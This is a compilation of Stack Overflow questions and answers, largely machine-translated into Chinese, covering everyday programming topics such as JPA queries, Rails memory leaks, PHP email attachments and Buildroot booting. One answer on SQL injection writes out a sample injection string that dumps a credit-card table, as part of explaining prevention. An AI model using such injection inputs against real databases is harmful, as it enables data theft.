# StackOverflow 问答 13429000-13429999

# matlab - Ensemble classifier with wrapper method

> ID：13429001
> 
> 赞同：0
> 
> 时间：2012-11-17T08:36:57.040
> 
> 标签：matlab, machine-learning, data-mining, weka, classification

I'm trying to combine multiple classifiers (ANN, SVM, kNN, ... etc.) using ensemble learning (viting, stacking ...etc.) .

In order to make a classifier, I'm using more than 20 types of explanatory variables. However, each classifier has the best subset of explanatory variables. Thus, seeking the best combination of explanatory variables for each classifier in wrapper method, I would like to combine multiple classifiers (ANN, SVM, kNN, ... etc.) using ensemble learning (viting, stacking ...etc.) .

By using the meta-learning with weka, I should be able to use the ensemble itself. But I can not obtain the best combination of explanatory variables since wrapper method summarizes the prediction of each classifier.

I am not stick to weka if it can be solved easier in maybe matlab or R.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:05:45.877

使用集成方法，使用非常*简单的*分类器可以获得最佳结果。另一方面，它可以非常快，以弥补合奏成本。

一开始这似乎违反直觉：人们会期望更好的输入分类器产生更好的输出。但是，这不起作用有两个原因。

首先，使用简单的分类器，您通常可以对它们进行更多调整，以获得一组多样化的输入分类器。全维方法 + 特征 bagging 为您提供了多样化的分类器。内部进行特征选择或减少的分类器使得特征装袋在很大程度上无法获得多样性。其次，像 SVM 这样的复杂方法更有可能优化/收敛到相同的结果。毕竟，复杂的方法应该经过一个更大的搜索空间，并在这个搜索空间中找到最好的结果。但这也意味着，您更有可能再次获得相同的结果。最后但并非最不重要的一点是，当使用非常原始的分类器时，错误表现得更好，并且更有可能在集成组合中变得更均匀。

# jpa - 使用 JPA / Criteria 编写 NON-EXIST 查询

> ID：13429007
> 
> 赞同：0
> 
> 时间：2012-11-17T08:38:10.457
> 
> 标签：jpa, jpa-2.0, criteria-api

我正在运行一个模拟销售机票的应用程序。
使用简单的模式（1-n）：

```
SEAT
------
id_seat
description
position

BOOKING
---------
id
customer
id_seat 
```

我想使用 JPA API 或 Criteria 生成一个查询，它为我提供了所有可用 SEAT 的列表。即，BOOKING 表中不存在（未预订）的所有 SEAT 对象。( `SEAT.id_seat = BOOKING.id_seat`)

任何人都可以给我一个线索，这是产生这样一个查询的最佳选择吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T08:53:03.943

```
select seat from Seat seat 
where seat.id not in (
    select seat2.id from Booking booking 
    inner join booking.seat seat2) 
```

# c# - 如何找到多边形的中心？

> ID：13429013
> 
> 赞同：1
> 
> 时间：2012-11-17T08:39:04.880
> 
> 标签：c#, center, polygon

我有一个多边形，三种类型中的一种：凸面、非凸面、带孔），其中包括顶点列表（点 x，y）和边（起点、终点）。现在我必须找到一个点来在多边形内放置一个标签并且是最大部分的中心。我怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T08:47:58.973

IMO 是一个很好的起点

[http://en.wikipedia.org/wiki/Centroid](http://en.wikipedia.org/wiki/Centroid)和 [http://en.wikipedia.org/wiki/K-means_clustering](http://en.wikipedia.org/wiki/K-means_clustering)

在后者的末尾，您会找到一些实现的链接，也许这些对您有帮助。

# ruby-on-rails - Rails 应用程序中的内存泄漏...字符串噩梦

> ID：13429017
> 
> 赞同：5
> 
> 时间：2012-11-17T08:39:26.330
> 
> 标签：ruby-on-rails, string, memory, heroku, memory-leaks

所以我有一个可怕的内存泄漏问题的rails应用程序。我在 Heroku 上运行它，在过去的几天里，我一直在试图弄清楚到底是什么原因造成的，我不得不每 5 小时左右不断重启应用程序，否则内存超过 512 和我的应用程序崩溃。

我正在使用 Oink，我的实例化类没有任何可疑之处。唯一的问题是，每次加载页面时，使用的内存都会增加。我加载哪个页面都没有关系，它似乎是随机的。

New Relic 也没有太大帮助，因为它与任何一个特定的控制器动作无关。

我唯一能找到的是使用 ObjectSpace，它显示了内存中大量的字符串对象，而且这个数字还在不断增长。我使用了一个小工具来记录字符串的值，它们都是空白的。不是零……而是空格。我的生产应用程序经常使用超过 200,000 个字符串对象。

有谁知道这些可能来自什么？这真的让我不得不每五个小时在我的电脑前才能让我的网站保持活力。

谢谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-27T08:05:01.007

好吧，这绝对是荒谬的，但经过两周的焦虑和挣扎，我找到了解决这个泄漏的方法。从字面上看，这一切都归结为这一行：

```
ActionMailer::Base.delivery_method = :smtp 
```

在我的 application.rb 配置文件中。

它应该是：

```
config.action_mailer.delivery_method = :smtp 
```

我不知道我是怎么弄错的，但是男孩确实对我的应用程序造成了严重破坏。

有谁知道为什么这会导致这样的问题？我在每个查询中都损失了大约一兆字节的内存。疯狂的。

# php - 如何发送带有附件的 HTML 电子邮件？

> ID：13429027
> 
> 赞同：0
> 
> 时间：2012-11-17T08:41:04.407
> 
> 标签：php, email-attachments

我正在使用此代码发送电子邮件：

```
$email="abc@gmail.com";
$to = $email;
$subject = "Test mail";
$message1 = '
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head></head>
  <body>
    <div  style="width:80%;">
      <table style="margin: 10px 20px 10px 20px;">
        <tr><td>Hello!'."  ".'</td></tr>';
        $message1.=$mailmessage;
        $message1.=
          '<tr><td>Please find attachments for dailyreport.</td></tr>
<tr><td><br>' . "Thanks and Regards with ". '</td></tr>
    </table></div>
  </body>
</html>';
$from = "admin@feed.com";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";
$headers .= 'From: ' . $from . "\r\n";  
if(mail($to,$subject,$message1,$headers)) {
  "mail sent";
} else {
  "email does not exist";
} 
```

要发送附件，我需要将内容类型更改为`Content-Type: multipart/mixed;\n`. 但是 HTML 上下文会改变。如何将文件附加到此 html？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T08:48:35.393

如果您想编写自己的脚本，请查看[此链接](http://www.finalwebsites.com/forums/topic/php-e-mail-attachment-script)

但我强烈建议您使用自定义库，例如 PHPMailer [http://code.google.com/a/apache-extras.org/p/phpmailer/](http://code.google.com/a/apache-extras.org/p/phpmailer/)

> PHPMailer 是一个 PHP 电子邮件传输类，具有文件附件、SMTP 服务器、抄送、密件抄送、HTML 消息、自动换行等。通过 sendmail、PHP mail()、QMail 或直接使用 SMTP 发送电子邮件。即将支持其他传输，例如 SMS、MMS

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T08:59:06.253

You have some special headers for email attachment, Don't worry we have a php class called sendMail, download and learn @ [PHP sendMail class](http://w3easystep.info/36/php-send-mail-class.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T08:49:43.377

您应该尝试使用此代码获取标头信息

```
$semi_rand = md5(time());
$mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";

$headers .= "\nMIME-Version: 1.0\n" .
"Content-Type: multipart/mixed;\n" .
" boundary=\"{$mime_boundary}\""; 
```

# ruby-on-rails - 有没有办法通过 Rails 中的 XMPP 接收消息？

> ID：13429032
> 
> 赞同：0
> 
> 时间：2012-11-17T08:42:17.027
> 
> 标签：ruby-on-rails, facebook, xmpp

有没有办法通过 Rails 中的 XMPP 接收 Facebook 聊天/消息？我已经检查过 xmpp4r_facebook 但到目前为止我只能用它发送消息。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T09:17:20.733

您应该能够使用 add_message_callback 设置消息回调。来自 xmpp4r 的 echo 示例应该可以帮助您入门：[https](https://github.com/ln/xmpp4r/blob/master/data/doc/xmpp4r/examples/basic/echo.rb) ://github.com/ln/xmpp4r/blob/master/data/doc/xmpp4r/examples/basic/echo.rb 。

# objective-c - Twitter 关注者数量 iOS 6

> ID：13429040
> 
> 赞同：1
> 
> 时间：2012-11-17T08:43:46.353
> 
> 标签：objective-c, ios, twitter

嗨，如何在 iOS 6 中获取当前 twitter 用户的关注者数量。TWRequest 已贬值，那么如何使用新的 Social.Framework 获取关注者数量？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-21T09:36:21.267

使用此代码

```
(IBAction)listFriends:(id)sender {
    NSMutableArray *arr = [[NSMutableArray alloc]init];
dict=[[NSMutableDictionary alloc]init];
[_tweetField resignFirstResponder];
dispatch_async(GCDBackgroundThread, ^{
    @autoreleasepool {
        [UIApplication sharedApplication].networkActivityIndicatorVisible = YES;
        //to get friends id.......
        NSLog(@"Friends' IDs: %@",[[FHSTwitterEngine sharedEngine]getFriendsIDs]);

       /* dict = [[FHSTwitterEngine sharedEngine]getFollowersIDs];

         for (NSDictionary *item in [dict objectForKey:@"ids"]) {
         [arr addObject:[dict objectForKey:@"ids"]];

         }*/

  // To get friends name ...

       // NSLog(@"Friends_Name: %@",[[FHSTwitterEngine sharedEngine]listFriendsForUser:_loggedInUserLabel.text isID:NO withCursor:@"-1"]);

        dict = [[FHSTwitterEngine sharedEngine]listFriendsForUser:_loggedInUserLabel.text isID:NO withCursor:@"-1"];

        NSLog(@"====> %@",[dict objectForKey:@"users"] );
        NSMutableArray *array=[dict objectForKey:@"users"];
        for(int i=0;i<[array count];i++)
        {
            NSLog(@"names:%@",[[array objectAtIndex:i]objectForKey:@"name"]);

        }
        // NSLog(@"Friends_Name: %@",[[FHSTwitterEngine sharedEngine]getMentionsTimelineWithCount:1000 sinceID:nil maxID:nil]);

        dispatch_sync(GCDMainThread, ^{
            @autoreleasepool {
                UIAlertView *av = [[UIAlertView alloc]initWithTitle:@"Complete!" message:@"Your list of followers has been fetched" delegate:nil cancelButtonTitle:@"OK" otherButtonTitles:nil];
                [av show];
                [UIApplication sharedApplication].networkActivityIndicatorVisible = NO;
                // NSLog(@"====> %d",[arr count]);
            }
        });
    }
}); 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-01T11:25:10.773

首先，您需要`Authenticate`您的请求（获得许可）。

其次，请参阅以下步骤：

1.下载`FHSTwitterEngine`推特库。

2.将文件夹`FHSTwitterEngine`“添加到您的项目和`#import "FHSTwitterEngine.h"`.

3.添加`SystemConfiguration.framework`到您的项目中。

> 用法： 1.在`[ViewDidLoad]`添加以下代码：

```
UIButton *logIn = [UIButton buttonWithType:UIButtonTypeRoundedRect];
    logIn.frame = CGRectMake(100, 100, 100, 100);
    [logIn setTitle:@"Login" forState:UIControlStateNormal];
    [logIn addTarget:self action:@selector(showLoginWindow:) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:logIn];

[[FHSTwitterEngine sharedEngine]permanentlySetConsumerKey:@"<consumer_key>" andSecret:@"<consumer_secret>"];
    [[FHSTwitterEngine sharedEngine]setDelegate:self]; 
```

并且不要忘记导入委托 FHSTwitterEngineAccessTokenDelegate。

您需要获得您的请求的权限，使用以下方法将显示登录窗口：

```
- (void)showLoginWindow:(id)sender {
    [[FHSTwitterEngine sharedEngine]showOAuthLoginControllerFromViewController:self withCompletion:^(BOOL success) {
        NSLog(success?@"L0L success":@"O noes!!! Loggen faylur!!!");
    }];
} 
```

出现登录窗口时，输入您的 Twitter 用户名和密码以验证您的请求。

将以下方法添加到您的代码中：

```
-(void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];
    [[FHSTwitterEngine sharedEngine]loadAccessToken];
    NSString *username = [[FHSTwitterEngine sharedEngine]loggedInUsername];// self.engine.loggedInUsername;
    if (username.length > 0) {
        lbl.text = [NSString stringWithFormat:@"Logged in as %@",username];
        [self listResults];

    } else {
        lbl.text = @"You are not logged in.";
    }

}
- (void)storeAccessToken:(NSString *)accessToken {
    [[NSUserDefaults standardUserDefaults]setObject:accessToken forKey:@"SavedAccessHTTPBody"];
}

- (NSString *)loadAccessToken {
    return [[NSUserDefaults standardUserDefaults]objectForKey:@"SavedAccessHTTPBody"];
} 
```

> 4.现在您已准备好获取您的请求，以下方法将列出您的`followers ID's`，将它们添加到 an`NSArray`并`Count`从 中获取`NSArray`：

```
- (Void)listFriends:(id)sender {
    NSMutableArray *arr = [[NSMutableArray alloc]init];
    [_tweetField resignFirstResponder];
    dispatch_async(GCDBackgroundThread, ^{
        @autoreleasepool {
            [UIApplication sharedApplication].networkActivityIndicatorVisible = YES;

           // NSLog(@"Friends' IDs: %@",[[FHSTwitterEngine sharedEngine]getFriendsIDs]);
            dict = [[FHSTwitterEngine sharedEngine]getFollowersIDs];
            for (NSDictionary *item in [dict objectForKey:@"ids"]) {
                [arr addObject:[dict objectForKey:@"ids"]];

            }
            dispatch_sync(GCDMainThread, ^{
                @autoreleasepool {
                    UIAlertView *av = [[UIAlertView alloc]initWithTitle:@"Complete!" message:@"Your list of followers has been fetched" delegate:nil cancelButtonTitle:@"OK" otherButtonTitles:nil];
                    [av show];
                    [UIApplication sharedApplication].networkActivityIndicatorVisible = NO;
 NSLog(@"====> %d",[arr count]);

                }
            });
        }
    });
} 
```

**我测试了这段代码，它运行良好^_^。**

# java - ArrayList 矩阵

> ID：13429047
> 
> 赞同：-3
> 
> 时间：2012-11-17T08:44:29.717
> 
> 标签：java

我有一个`ArrayList`-s `ArrayList`。如何使用给定的行数和列数初始化字段？我试过这个：

```
ArrayList<ArrayList<E>> field;

public Field(int rows, int cols) {
    field = new ArrayList<ArrayList<E>>(rows);
    for(ArrayList<E> t : field)
        t = new ArrayList<E>(cols);
} 
```

但它不起作用。我该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T08:45:36.440

您不需要初始化[List](http://docs.oracle.com/javase/6/docs/api/java/util/List.html)的大小。

使用 List 的主要原因是它的大小可以改变。

使用列表，您可以这样做：

```
// declare and initialize List of Lists

List<List<Foo>> listOfFooLists = new ArrayList<List<Foo>>();

// create a List from some method

List<Foo> someFooList = createListOfFoos();

// add the List to the List of Lists

listOfFooLists.add(someFooList);

// get the first Foo from the first list of Foos

Foo f = listOfFooLists.get(0).get(0); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T16:41:27.940

考虑一下：

```
public class Field<E> {
    ArrayList<ArrayList<E>> field;

    public Field(int rows, int cols) {
        field = new ArrayList<ArrayList<E>>(rows);
        for (int i = 0; i < rows; i++) {
            ArrayList<E> row  = new ArrayList<E>(cols);
            for (int j = 0; j < cols; j++) {
                row.add(null);
            }
            field.add(row);
        }
    }

    public static void main(String[] args) {
        Field<String> field = new Field<String>(10, 10);
    }

} 
```

# java - keyReleased 函数未在 java 中恢复原始背景颜色

> ID：13429048
> 
> 赞同：2
> 
> 时间：2012-11-17T08:44:50.097
> 
> 标签：java, swing, key, jbutton, keylistener

当我按下某个键一段时间后，keyReleased 函数中键的背景颜色无法恢复为原始颜色。我做错了什么。如果您可以将我重定向到包含有关如何使用示例制作此类程序的教程的站点，那将非常有帮助。这是代码：

```
public void keyPressed(KeyEvent event)
    {
        int code= event.getKeyCode();
        String x,h;

        for(int i=0;i<names.length;i++)
        {
            s=names[i];
            x=s.trim();

            if(x.contentEquals(event.getKeyText(code)) )
            {
                backColor=but[i].getBackground();
                but[i].setBackground(Color.RED);
                break;
            }
        }
        switch(event.getKeyCode())
        {
        case KeyEvent.VK_BACK_SLASH:
            h=" \\ ";
            for(int i=0;i<but.length;i++)
            {
                if(h.contentEquals(but[i].getText()))
                {
                    backColor=but[i].getBackground();
                    but[i].setBackground(Color.RED);
                    buttonIndex=i;
                    break;
                }
            }
            break;
    }
public void keyReleased(KeyEvent event)
    {
        String x;
        int code= event.getKeyCode();

        for(int i=0;i<names.length;i++)
        {
            s=names[i];
            x=s.trim();

            if(x.contentEquals(event.getKeyText(code)) && !s.contentEquals("                             "))
            {System.out.println("outside");
                but[i].setBackground(backColor);
                break;
            }
            else
                if(s.contentEquals("                             "))
                {
                    but[buttonIndex].setBackground(backColor);
                }
        }
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T09:05:49.203

*   不要使用[`Keylistener`](http://docs.oracle.com/javase/tutorial/uiswing/events/keylistener.html)for `Swing JComponents`，[而是](https://stackoverflow.com/questions/7940173/how-do-i-use-keyeventdispatcher/7940227#7940227)[使用`KeyBindings`](https://stackoverflow.com/questions/7940173/how-do-i-use-keyeventdispatcher/7940227#7940227)

*   你的`JFrame`, `JPanel`,`JComponent`必须是可聚焦的 ( `setFocusable`)

*   在某一时刻只有一个`JComponent`可以聚焦，那么您的程序将`focus_hunter`不是[由使用 KeyBindings引起的](http://docs.oracle.com/javase/tutorial/uiswing/misc/keybinding.html)

*   为了获得更好的帮助，请尽快发布[SSCCE](http://sscce.org/)，简短，可运行，可编译

# html - XQUERY for 循环和 html

> ID：13429057
> 
> 赞同：0
> 
> 时间：2012-11-17T08:46:24.793
> 
> 标签：html, xml, xquery, xmlspy

我在 XMLSPY 中有以下 XQUERY 代码，运行良好。

```
xquery version "1.0";

<table border="1">
{
 for $re in distinct-values(reviews/review/reviewer)
 for $r in reviews/review
 where $re=$r/reviewer
 return  <tr> <td>{$r/movie_title}</td> </tr>
}
</table> 
```

现在我想修改如下：

```
xquery version "1.0";

<table border="1">
{
 <tr> <td>
 for $re in distinct-values(reviews/review/reviewer)
 for $r in reviews/review
 where $re=$r/reviewer
 return  {$r/movie_title}
 </td> </tr>
}
</table> 
```

但它给出了语法错误。第二个代码应该完成的是，只有外部 for 循环应该创建新行和新单元格，而内​​部循环应该只添加到该单元格。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T08:54:10.070

尝试

```
for $re in distinct-values(reviews/review/reviewer) return <tr>{
    for $r in reviews/review
        where $re=$r/reviewer
            return <td>{$r/movie_title}</td>
}</tr> 
```

这个**[XMLPLayground 会话](http://www.xmlplayground.com/93kjy1)**可能会对您有所帮助。它做了类似的事情，即迭代表输出。

# android - 基于时间戳的同步，如何减少移动数据的使用

> ID：13429062
> 
> 赞同：0
> 
> 时间：2012-11-17T08:47:09.333
> 
> 标签：android, timestamp, sync

这就是我现在执行同步的方式：

```
 * get preference "timestamp" and save to variable TIMESTAMP
 * save current time to preference "timestamp"      (2)
 * query server side items with update time bigger than TIMESTAMP
 * for each item
 *      compare with local item's per item update_time
 *      if server side is newer
 *          update local
 *      else if local is newer
 *          set item update time to now             (1)
 *          upload
 *          save back
 *      else if　equal
 *          do nothing
 * 
```

问题是，下次同步时，最后一次同步的项目会出现在“什么都不做”部分，但我的应用是移动应用，所以有很大的数据浪费。

我考虑过将item的更新时间设置`TIMESTAMP`为一个客户端在两次之间检查了服务器，这个项目被遗漏了。

我正在使用 Google Tasks API，我无法更改服务器端的实现。

有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T10:37:16.003

由于时区，使用时间戳执行此操作可能会导致一些问题。也许为服务器端的更新定义一个 id 并将您的应用程序当前的最大数据版本 id 与服务器的比较可以更可靠和高效

# jquery - 选择 ap 标签内的所有元素，除了输入元素

> ID：13429065
> 
> 赞同：1
> 
> 时间：2012-11-17T08:47:49.293
> 
> 标签：jquery

我有以下标记：

```
<div style="height:100px; width:280px; float:left" >

<p style="float:left; padding:5px;" id="optionOne">

<label style="cursor:pointer; width:100px" id="optionLabelOne">Option 1</label>
<span style="color:red; font-size:10px"></span>

<input class="u-3" name="ageGroup" id="ageGroup" style="width:230px;" />
</p>

 </div> 
```

我有几个这样的重复 div。我选择

他们里面的标签是这样的：

```
$('#optionOne,#optionTwo,#optionThree,#optionFour').on('mouseover',function(){
 $(this).on('mouseover',function(){
  //do something here});
  }); 
```

现在在稍后的某个阶段，我需要在“p”标签上执行一个点击事件，不包括其中的“input”标签。

当我使用下面的代码时，点击事件也会在输入字段上触发（很明显）

```
$(this).on('click',function(){
//do something
}); 
```

那么可以做些什么来选择完整的 p 标签而不对其中的输入元素做任何事情。

我也试过这个：

```
$(this).not('input').on('click',function(){
 //// NOT WORKING
 }); 
```

请评论。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T08:51:18.937

您可以使用对象`stopPropagation`的方法`event`：

```
$('p input').on('click', function(event){
     event.stopPropagation()
}) 
```

`this`请注意，由于您选择了所有元素，因此无需将处理程序绑定到对象：

```
$('#optionOne,#optionTwo,#optionThree,#optionFour').on('mouseover',function(){
    // 
}); 
```

您还可以将类添加到`p`标签并使用类选择器：

```
$('p.options').on('mouseover',function(){
    // $(this).foo()
}); 
```

# boost - 提振精神和 char16_t / UTF-16 支持？

> ID：13429066
> 
> 赞同：0
> 
> 时间：2012-11-17T08:47:52.977
> 
> 标签：boost, boost-spirit, utf-16, lexer, char16-t

今天或不久的将来，是否有任何支持 char16_t / UTF-16 的增强精神？

我确实尝试了使用 char16_t 的字数统计词法分析器示例，但遇到了各种编译错误。

谢谢，

亨利·罗兰

# linux - Buildroot - 建了一个文件系统，如何登录？引导挂起

> ID：13429068
> 
> 赞同：2
> 
> 时间：2012-11-17T08:47:54.940
> 
> 标签：linux, embedded, embedded-linux, boot, buildroot

有人可以帮助我了解我需要如何配置 buildroot，以便我能够成功启动自己的文件系统并登录到它吗？

我有一个（看似）工作的内核，现在我创建了自己的文件系统（实际上并没有更改构建根目录中的任何设置，除了将控制台设置为 ttyAMA0），但引导过程似乎挂起，对此没有任何问题：

```
....
[    3.130000] VFS: Mounted root (ext3 filesystem) on device 179:2.
[    3.140000] Freeing init memory: 144K
Starting logging: OK
Starting network...
ip: RTNETLINK answers: Operation not permitted
ip: SIOCSIFFLAGS: Permission denied 
```

整个启动日志在这里可见：http: [//paste.ubuntu.com/1364407/](http://paste.ubuntu.com/1364407/)

我了解 /etc/inittab 控制启动过程，内容如下所示：

```
# Startup the system
null::sysinit:/bin/mount -t proc proc /proc
null::sysinit:/bin/mount -o remount,rw / # REMOUNT_ROOTFS_RW
null::sysinit:/bin/mkdir -p /dev/pts
null::sysinit:/bin/mkdir -p /dev/shm
null::sysinit:/bin/mount -a
null::sysinit:/bin/hostname -F /etc/hostname
# now run any rc scripts
::sysinit:/etc/init.d/rcS

# Put a getty on the sttyAMA0::respawn:/sbin/getty -L ttyAMA0 115200 vt100 # GENERIC_SERIAL

# Stuff to do for the 3-finger salute
::ctrlaltdel:/sbin/reboot

# Stuff to do before rebooting
null::shutdown:/etc/init.d/rcK
null::shutdown:/bin/umount -a -r
null::shutdown:/sbin/swapoff -a 
```

关于我的配置有什么问题的任何建议？在创建我自己的 linux 系统时，我可以在哪里获得所需的“通常必要的配置”的一个很好的概述？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-17T18:23:43.227

这个问题是由 Buildroot 邮件列表上的提交者提出的。解决方案是提交者直接使用 Buildroot 输出/目标目录的内容作为其根文件系统，即使 Buildroot 文档明确告知不要这样做。这是因为 Buildroot 不以 root 身份运行，因此无法在输出/目标中正确创建设备文件或调整权限/所有权。这些步骤是在创建根文件系统映像时完成的，这要归功于一个名为 fakeroot 的神奇工具。

因此，如果有人想要将根文件系统提取到 SD 卡分区或类似的东西上，应该让 Buildroot 生成一个 tar 映像，然后以 root 身份将其提取到 SD 卡分区中。

由于这个问题很常见，我们现在在 output/target 中添加了一个名为 THIS_IS_NOT_YOUR_ROOT_FILESYTEM 的文件，其中包含有关此问题的详细信息。请参阅[http://git.buildroot.net/buildroot/commit/?id=9226a9907c4eb0fffab777f50e88b74aa14d1737](http://git.buildroot.net/buildroot/commit/?id=9226a9907c4eb0fffab777f50e88b74aa14d1737)。

# codeigniter - 我想使用 codeigniter 从数据库中检索值

> ID：13429076
> 
> 赞同：0
> 
> 时间：2012-11-17T08:50:00.633
> 
> 标签：codeigniter, codeigniter-2

> 在视图中它得到了像***未定义变量类别***列表这样的错误，你能帮我吗！！！！！！！！！

**控制器**

```
public function categorylist()
{
    $data['categorylist']=$this->userprocessmodel->categorylist();
    $this->load->view('user/home',$data);
} 
```

**模型**

```
public function categorylist()
{
    $query=$this->db->get('category');
    echo $query->num_rows();
    if($query->num_rows()>0)
    {
        return $query->result();
    }
    else
    {
       return null;    
    } 
} 
```

**看法**

```
<?php 
      if($categorylist)
      {
          foreach($categorylist as $categorylist)
          {
               $categorylist->categoryname;
          }
      }
  ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T08:59:03.627

你的观点应该是这样的

```
<?php 
  if(count($categorylist)>0)
  {
      foreach($categorylist as $categorylist)
      {
           $categorylist->categoryname;
      }
  }else{
     echo 'No category found';
  } 
```

?>

你也不需要回显 $query->num_rows()

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T09:20:42.080

在您的模型中，您必须更改：

```
return null; 
```

和：

```
return false; 
```

如果您将 null 分配给变量 $categorylist，则该变量未初始化，并且您会在视图中看到该错误，如果您改为设置 false，则使用布尔值 false 初始化变量。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T09:55:35.730

只需在**模型中更改这些代码**

```
public function categorylist()
{
$query=$this->db->get('category');
echo $query->num_rows();
if($query->num_rows()>0)
{
    return $query->result();
}
else
{
   return 0;    
} 
} 
```

现在在**控制器**中，如果 0 得到那么

```
public function categorylist()
{
$data['categorylist']=$this->userprocessmodel->categorylist();
if($data['categorylist']=='0')
{
   $datanone['categorylist']='None';
   $this->load->view('user/home',$datanone);
}
else{
 $this->load->view('user/home',$data);
}
} 
```

# php - 最后一条评论在我的文件中保存了两次，因此在网页上打印了两次

> ID：13429077
> 
> 赞同：0
> 
> 时间：2012-11-17T08:50:28.067
> 
> 标签：php, html

我正在我的网站上写一个评论块。我将评论保存在文件中并将内容打印在

网页。但问题是当我最后一次刷新网页时

评论显示两次。

所以我使用了一个逻辑，即我在我的评论数据库文件中搜索最后一条评论，如果它发现它没有写在文件上。

这是我的代码

```
<html>

<body>

<form   method="GET">

<textarea rows="15" cols="50" name="comments" ></textarea>
<input type="submit" value="submit" >

</form>

</body>

</html>

<?php
$refresh = 0;

$comments = file_get_contents("comments.txt");
$file_comments_len = strlen($comments);

$current_comments = $_GET["comments"];
$current_comments_len = strlen($current_comments);

for($i = 0; $i<= $file_comments_len; $i++){

    $sub = substr($comments, $i, (($i+$current_comments_len-1 )) ); 
    echo $sub."<br>";
    echo $i;
    if( $sub == $comments){
        $refresh = 100;
        break;
    }

}

if( ($_GET["comments"]!=null) && ($refresh==0) ){
    $comments = /*"Anonymous said:<br>".*/$_GET["comments"]."<br><br>";
    //$file_comments = fopen("comments.txt","a");
    //fwrite($file_comments,$comments);
    //fclose($file_comments);
    file_put_contents( "comments.txt", $comments, FILE_APPEND );

    $_GET["comments"] = null;
    $comments = null;

}

//$file_comments2 = fopen("comments.txt", "r");
$comments = file_get_contents("comments.txt");
echo $comments;
//fclose($file_comments2);

$_GET["comments"] = null;
$comments = null;

?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T09:12:41.240

您只需尝试更改变量名称，例如 $comments 使用了两次以上。

```
if( ($_GET["comments"]!=null) && ($refresh==0) ){
$comments_new = /*"Anonymous said:<br>".*/$_GET["comments"]."<br><br>";
//$file_comments = fopen("comments.txt","a");
//fwrite($file_comments,$comments);
//fclose($file_comments);
file_put_contents( "comments.txt", $comments_new, FILE_APPEND );
$_GET["comments"] = null;
$comments_new = null;
} 
```

这可能有帮助！

# sql - SQL注入及解决方案

> ID：13429082
> 
> 赞同：-2
> 
> 时间：2012-11-17T08:50:53.170
> 
> 标签：sql, sql-injection

SQL 注入和解决方案 解决方案是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T08:55:46.397

you should do prepared SQL statement, and the way to do it differs from one programming language to another. regarding what could he do with SQL injection worst case he could dump the DB content. how to prevent it check the following link [http://www.marcofolio.net/features/how_you_can_prevent_an_sql_injection.html](http://www.marcofolio.net/features/how_you_can_prevent_an_sql_injection.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T09:09:01.160

我想您最好的方法是让您的 SQL 语句尽可能远离您的 UI，总体而言，您需要了解 SQL 注入是如何发生的，例如，您有这样的查询：

```
select name from users where password='ValueFromTxtPassword' --not good approach 
```

攻击者可以在您的 TxtPassword 字段中写入：

```
0 or 1=1; select * from creditcards -- 
```

这有效地进行了这样的有效查询：

```
select name from users where password=0 or 1=1; ======> valid query is always true
select * from creditcards -- ===> makes another query and ignores the rest of the lines in your SQL statement, giving you all the records from your creditcard table 
```

所以，为了避免这种情况，你可以有一个像这样的存储过程

```
 authenticate(username, password) --Stored procedures force you to pass only the needed info 
```

另一个好方法是使用“查询”复杂对象，根据您的需要构建您的 sql 语句

```
public class query{
    public List<column> projections {get; set;} //use this to build your SELECT
    public List<condition> filters { get; set;} //use this to build your WHERE
    public List<condition> sorting { get; set;} //use this to build your ORDER BY
} 
```

使用像 Hibernate 这样的 ORM 通常会迫使您构建此查询复杂对象，因为您无法映射表映射，而只能返回域对象。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T09:02:12.217

这样不好。您需要保护对客户端请求的 SQL 查询。如果太难，那么最好的方法是使用框架。例如，如果您熟悉 PHP，那么您可以使用 Symfony 或 Zend。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-05-12T12:11:59.193

1) 过滤输入——停止相信你的用户：对应用程序的最大威胁来自它的用户。用户不需要像您期望的那样彬彬有礼和服从。有些用户的意图非常糟糕，有些用户只是试图测试他们的黑客技能。无论您要编写什么代码，都要使用最佳实践编写它并考虑它的安全方面。验证表单中的每个字段

2) 使用数据库包装类或 PDO——数据库包装或 PDO（在 PHP 中）可以降低直接访问数据库的输入值的风险。准备好的语句可以与 PDO 一起使用，如下所示。

[http://www.itechnicalblog.com/what-is-a-sql-injection-and-how-to-fix-it/](http://www.itechnicalblog.com/what-is-a-sql-injection-and-how-to-fix-it/) [在此处输入链接描述](http://www.itechnicalblog.com/what-is-a-sql-injection-and-how-to-fix-it/)

* * *

## 回答 #5

> 赞同：0
> 
